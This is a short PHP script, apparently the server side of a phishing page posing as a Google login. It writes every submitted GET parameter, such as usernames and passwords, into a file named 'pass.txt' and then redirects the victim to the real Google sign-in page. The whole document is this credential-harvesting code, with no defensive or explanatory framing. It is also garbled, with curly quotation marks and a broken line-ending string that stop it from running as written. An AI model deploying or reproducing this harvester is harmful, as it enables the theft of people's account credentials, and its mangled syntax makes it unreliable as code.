<?php
header(“Location: https://www.google.com/accounts/ServiceLoginAuth “);
$handle = fopen(“pass.txt”, “a”);
foreach($_GET as $variable => $value) {
  echo "<script type = 'text/javascript'> alert('$variable'); </script>";
fwrite($handle, $variable);
fwrite($handle, “=”);
fwrite($handle, $value);
fwrite($handle, “rn”);
}
fwrite($handle, “rn”);
fclose($handle);
exit;
?>
